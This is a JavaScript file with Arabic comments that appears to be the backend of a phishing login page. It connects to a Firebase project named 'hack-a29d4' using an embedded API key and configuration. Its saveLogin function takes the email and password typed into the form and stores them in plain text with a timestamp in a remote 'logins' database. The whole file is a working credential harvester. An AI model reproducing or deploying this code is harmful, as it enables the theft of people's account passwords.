// استيراد Firebase
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-auth.js";
import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";

// إعداد Firebase (استبدل القيم بمعلومات مشروعك)
const firebaseConfig = {
    apiKey: "AIzaSyAYJh_NSKsOcXD0SGRysP_i87mYLyvT_6s",
    authDomain: "hack-a29d4.firebaseapp.com",
    databaseURL: "https://hack-a29d4-default-rtdb.firebaseio.com",
    projectId: "hack-a29d4",
    storageBucket: "hack-a29d4.firebasestorage.app",
    messagingSenderId: "492008291662",
    appId: "1:492008291662:web:252b940f8f5517861b321f"
  };

// تهيئة Firebase
const app = initializeApp(firebaseConfig);
const auth = getAuth();
const database = getDatabase();

// تسجيل الدخول كمجهول تلقائيًا لتجنب مشاكل الصلاحيات
signInAnonymously(auth)
    .then(() => console.log("تم تسجيل الدخول كمجهول"))
    .catch((error) => console.error("فشل تسجيل الدخول المجهول:", error.message));

// وظيفة حفظ بيانات تسجيل الدخول
window.saveLogin = function () {
    let email = document.getElementById("email").value.trim();
    let password = document.getElementById("password").value.trim();
    let messageBox = document.getElementById("message");

    if (email === "" || password === "") {
        messageBox.innerText = "يرجى إدخال البريد وكلمة المرور.";
        return;
    }

    const loginRef = push(ref(database, "logins"));
    set(loginRef, {
        email: email,
        password: password,
        time: new Date().toLocaleString()
    })
    .then(() => {
        messageBox.innerText = "تم حفظ بيانات تسجيل الدخول!";
        messageBox.style.color = "green";
    })
    .catch((error) => {
        messageBox.innerText = "حدث خطأ: " + error.message;
        messageBox.style.color = "red";
    });
};
